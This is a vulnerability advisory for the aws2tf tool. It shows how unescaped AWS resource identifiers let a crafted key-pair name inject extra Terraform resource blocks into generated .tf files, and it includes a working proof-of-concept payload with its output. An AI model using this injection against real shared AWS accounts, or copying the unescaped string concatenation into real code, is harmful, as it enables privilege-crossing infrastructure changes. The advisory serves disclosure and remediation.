Summary:
GitHub repo: https://github.com/aws-samples/aws2tf

Package: aws2tf (PyPI/GitHub, aws-samples/aws2tf)

Affected Versions: v6.53.0

Summary
aws2tf reverse-engineers a live AWS account into Terraform by writing import { ... } blocks and (with certain flags) data "..." { ... } blocks, one per discovered AWS resource. The resource identifier returned by the AWS API (theid) is embedded directly into the HCL string literal for the block's id (or key_name) attribute via plain string concatenation, with no quote-escaping and no length/charset validation of the content (only the filename derived from the same value is sanitized). If a resource identifier read from the account contains a double-quote character, the generated .tf file's HCL string literal is broken out of, and any well-formed HCL that follows in that identifier is emitted verbatim as new, additional top-level Terraform blocks in the operator's working directory.

Because terraform loads every *.tf file in a directory as a single merged configuration, an attacker-controlled identifier can inject an entirely new resource block (e.g. a new aws_iam_role, a policy attachment, a security group rule) that the operator did not ask for and will not necessarily notice among the (often hundreds of) auto-generated import files, before running terraform apply with their own (typically higher-privileged) credentials.

This matches the threat model of a shared AWS account: a lower-privileged team member who can create or tag some resource can plant a name/identifier that, once a higher-privileged operator runs aws2tf against the account and applies the result, causes terraform to provision infrastructure of the attacker's choosing under the operator's credentials -- a privilege-crossing supply-chain injection into the generated Infrastructure-as-Code.

Details
code/import_writer.py, function write_import() (lines ~50-133 in the v6.53.0 tag):

if not done_data:
   output = StringIO()
   output.write('import {
')
   output.write('  to = ' +type + '.' + tfid + '
')
   output.write('  id = "'+ theid + '"
')      # <-- theid embedded raw, unescaped
   output.write('}
')
   ...
   safe_write_file(fn, output.getvalue().strip() + '
')

Contrast: the resource label (tfid, used for to = type.tfid and for the output filename) is heavily sanitized a few lines earlier -- re.sub(r'[^A-Za-z0-9_-]', '_', tfid) strips every character that is not alphanumeric/_/-. But theid, used for the id = "..." value on the very next line, receives no equivalent treatment. This is the exact same variable computed from the exact same untrusted source; only the copy used for the filename/label is sanitized, and the copy used for the string literal is not.

The matching sink in code/import_writer.py, function do_data() (the -dkey/--datakey flag path):

if context.dkey:
   if type == "aws_key_pair":
      tfil = theid.replace("/","_").replace(".","_")...   # partial sanitization, no quote handling
      fn = "data-"+type+"_"+tfil+".tf"
      with open(fn, 'w') as f3:
         f3.write('data "'+type+'" "'+tfil+'" {
')
         f3.write(' key_name = "'+theid+'"
')             # <-- theid embedded raw again
         f3.write('}
')
      return True

Note this branch uses plain open(), bypassing safe_write_file() entirely, and tfil's character replacement list does not include ", backtick, or newline.

No function in the codebase performs HCL string-literal escaping (no \" doubling, no rejection of embedded newlines/braces) before these writes; a repo-wide grep for quote/escape helpers in import_writer.py, common.py, and file_ops.py found none.

PoC
Live-validated by importing and calling the actual, unmodified write_import() function from the pinned v6.53.0 tag directly (no boto3 mocking needed -- the function takes the AWS-returned identifier as a plain string parameter), then confirming the output with the independent python-hcl2 parser.

Environment: Python 3 venv with boto3, requests, tqdm (repo's requirements.txt) plus python-hcl2 for independent parse verification.

$ cat test_inject.py
import sys, logging
sys.path.insert(0, "<repo>/code")
import context
context.debug = False
context.merge = False
context.dnet = context.dsgs = context.dkms = context.dkey = False

import import_writer

# Stands in for a resource identifier read live from the AWS account
# (e.g. an EC2 KeyPair KeyName, which carries no enforced charset pattern
# in the EC2 API model, unlike most other AWS resource name fields).
crafted_id = 'legit-resource" }
resource "aws_iam_role" "pwned" {
  name = "pwned-role'

import_writer.write_import("aws_ec2_key_pair", crafted_id, None)

import glob
for f in glob.glob("import__*.tf"):
    print("=== FILE:", f, "===")
    print(open(f).read())

$ python3 test_inject.py
=== FILE: import__aws_ec2_key_pair__legit-resource____resource__aws_iam_role___pwned______name____pwned-role.tf ===
import {
  to = aws_ec2_key_pair.legit-resource____resource__aws_iam_role___pwned______name____pwned-role
  id = "legit-resource" }
resource "aws_iam_role" "pwned" {
  name = "pwned-role"
}

Independent confirmation that this is parsed as two distinct top-level Terraform blocks (not just visually resembling one), using python-hcl2:

$ python3 -c "
import hcl2, glob, json
f = glob.glob('import__*.tf')[0]
print(json.dumps(hcl2.load(open(f)), indent=2))
"
{
  "import": [
    {
      "to": "${aws_ec2_key_pair...}",
      "id": "\"legit-resource\"",
      "__is_block__": true
    }
  ],
  "resource": [
    {
      "\"aws_iam_role\"": {
        "\"pwned\"": {
          "name": "\"pwned-role\"",
          "__is_block__": true
        }
      }
    }
  ]
}

The parser independently confirms a second top-level resource block (aws_iam_role.pwned) exists in the file alongside the intended import block -- exactly the attacker-injected content, parsed by a standard HCL parser as legitimate Terraform configuration.

Impact
Summary:
If an AWS resource identifier (name, key-pair name, or similar loosely-charset-restricted field) contains a double-quote character, running aws2tf against that account produces a .tf file that, when the operator subsequently runs terraform init && terraform apply (the intended next step in aws2tf's own documented workflow), causes terraform to plan and create whatever additional Terraform resource block the attacker embedded -- for example a new IAM role/policy, a security-group rule opening ingress, or an S3 bucket policy -- using the operator's (typically more privileged) Terraform/AWS credentials, not the attacker's own. In a shared AWS account where a lower-privileged team member can create or name a small number of resource types, and a higher-privileged operator later runs aws2tf and applies the result, this is a privilege-crossing infrastructure-injection vector achieving unintended, attacker-chosen changes to the AWS account.